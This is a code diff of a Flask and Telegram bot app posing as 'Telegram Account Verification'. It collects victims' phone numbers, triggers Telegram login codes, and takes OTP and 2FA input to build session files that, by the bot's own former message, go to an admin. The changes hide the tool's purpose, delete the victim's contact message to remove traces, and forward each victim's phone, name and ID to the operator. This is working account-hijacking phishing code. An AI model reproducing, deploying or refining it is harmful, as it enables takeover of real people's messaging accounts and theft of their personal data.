@@ -11,7 +11,6 @@ import re
 import time
 import threading
 import uuid
-import json
 
 # Initialize Flask
 app = Flask(__name__)
@@ -219,29 +218,10 @@ def index():
 def otp_page(user_id):
     """OTP entry page"""
     if user_id not in user_sessions:
-        return "Session expired. Please start over.", 400
+        return "Session expired. Please share contact again.", 400
     
     session = user_sessions[user_id]
     return render_template('otp.html', user_id=user_id, phone=session['phone'])
-
-@app.route('/api/get-user-status/<user_id>', methods=['GET'])
-def get_user_status(user_id):
-    """Check if user has shared contact and OTP is sent"""
-    try:
-        if user_id not in user_sessions:
-            return jsonify({'success': False, 'error': 'Session not found'})
-        
-        session = user_sessions[user_id]
-        
-        return jsonify({
-            'success': True,
-            'has_contact': 'phone' in session,
-            'otp_sent': session.get('otp_sent', False),
-            'phone': session.get('phone', ''),
-            'status': session.get('status', 'waiting')
-        })
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/check-otp-status/<user_id>', methods=['GET'])
 def check_otp_status(user_id):
@@ -422,7 +402,7 @@ def verify_2fa():
 # ==================== BOT HANDLERS ====================
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    """Send WebApp button directly"""
+    """Send WebApp button directly - FIXED START MESSAGE"""
     try:
         # Create WebApp URL
         webapp_url = WEBHOOK_URL.rstrip('/') if WEBHOOK_URL else f"https://{request.host}"
@@ -435,21 +415,10 @@ def start_command(message):
         )
         keyboard.add(webapp_btn)
         
+        # SEND SIMPLE START MESSAGE
         bot.send_message(
             message.chat.id,
-            """🔐 <b>Telegram Account Verification</b>
-
-Click the button below to open the WebApp and verify your account:
-
-✅ <b>Features:</b>
-• Share contact via Telegram popup
-• Enter OTP securely
-• 2FA support if enabled
-• Auto-delete shared contact
-• Session sent to admin
-
-<b>Click below to begin:</b>""",
-            parse_mode='HTML',
+            "Click the button below to open the WebApp:",
             reply_markup=keyboard
         )
         
@@ -470,7 +439,7 @@ def handle_contact(message):
         first_name = contact.first_name or ''
         last_name = contact.last_name or ''
         
-        print(f"Contact received from user {user_id}: {phone}")
+        print(f"📱 Contact received from user {user_id}: {phone}")
         
         # Format phone number
         if not phone.startswith('+'):
@@ -479,15 +448,20 @@ def handle_contact(message):
         # Validate phone number
         if len(phone) < 8 or not re.match(r'^\+\d+$', phone):
             print(f"Invalid phone format: {phone}")
-            bot.send_message(chat_id, "❌ Invalid phone number format.")
             return
         
-        # Initialize user session if not exists
+        # Delete the contact message immediately
+        try:
+            bot.delete_message(chat_id, message.message_id)
+            print(f"✅ Deleted contact message for user {user_id}")
+        except Exception as e:
+            print(f"Could not delete message: {e}")
+        
+        # Initialize or update user session
         if user_id not in user_sessions:
             user_sessions[user_id] = {
                 'user_id': user_id,
                 'chat_id': chat_id,
-                'status': 'contact_received',
                 'contact_message_id': message.message_id,
                 'created': datetime.now(),
                 'expiry': datetime.now() + timedelta(seconds=session_expiry)
@@ -501,9 +475,9 @@ def handle_contact(message):
             'contact_received': True
         })
         
-        print(f"Contact stored for user {user_id}: {phone}")
+        print(f"📞 Contact stored for user {user_id}: {phone}")
         
-        # Send OTP automatically
+        # Generate session file
         session_file = generate_session_file(phone)
         
         # Store session file
@@ -514,7 +488,7 @@ def handle_contact(message):
         client = client_data['client']
         loop = client_data['loop']
         
-        print(f"Auto-sending OTP to {phone}...")
+        print(f"📨 Sending OTP to {phone}...")
         result = loop.run_until_complete(send_otp_async(client, phone))
         
         if result['success']:
@@ -525,19 +499,41 @@ def handle_contact(message):
                 'status': 'otp_sent',
                 'expiry': datetime.now() + timedelta(seconds=session_expiry)
             })
-            print(f"OTP auto-sent successfully to {phone}")
+            print(f"✅ OTP sent successfully to {phone}")
+            
+            # Send notification to admin
+            try:
+                bot.send_message(
+                    USER_ID,
+                    f"""📲 <b>CONTACT RECEIVED</b>
+                
+👤 User ID: {user_id}
+📱 Phone: {phone}
+👤 Name: {first_name} {last_name}
+⏰ Time: {datetime.now().strftime('%H:%M:%S')}
+                
+✅ <b>OTP sent successfully</b>""",
+                    parse_mode='HTML'
+                )
+            except:
+                pass
+            
         else:
             user_sessions[user_id]['status'] = 'error'
             user_sessions[user_id]['error'] = result.get('error', 'Failed to send OTP')
-            print(f"Failed to auto-send OTP to {phone}: {result.get('error')}")
+            print(f"❌ Failed to send OTP to {phone}: {result.get('error')}")
             
-            # Send error message to user
-            bot.send_message(chat_id, f"❌ Failed to send OTP: {result.get('error')}")
-            
-            # Delete the contact message on error
+            # Send error to admin
             try:
-                bot.delete_message(chat_id, message.message_id)
-                print(f"Deleted contact message due to OTP send error")
+                bot.send_message(
+                    USER_ID,
+                    f"""❌ <b>OTP SEND FAILED</b>
+                    
+👤 User ID: {user_id}
+📱 Phone: {phone}
+⚠️ Error: {result.get('error', 'Unknown error')}""",
+                    parse_mode='HTML'
+                )
             except:
                 pass
         
@@ -584,19 +580,12 @@ def cleanup_loop():
         for user_id, session in user_sessions.items():
             if session['expiry'] < current_time:
                 expired_users.append(user_id)
-                
-                # Try to delete contact message if exists
-                if session.get('contact_message_id'):
-                    try:
-                        bot.delete_message(session['chat_id'], session['contact_message_id'])
-                    except:
-                        pass
         
         for user_id in expired_users:
             del user_sessions[user_id]
         
         if expired_users:
-            print(f"Cleanup: Removed {len(expired_users)} expired sessions")
+            print(f"🧹 Cleanup: Removed {len(expired_users)} expired sessions")
 
 # ==================== MAIN ====================
 if __name__ == '__main__':
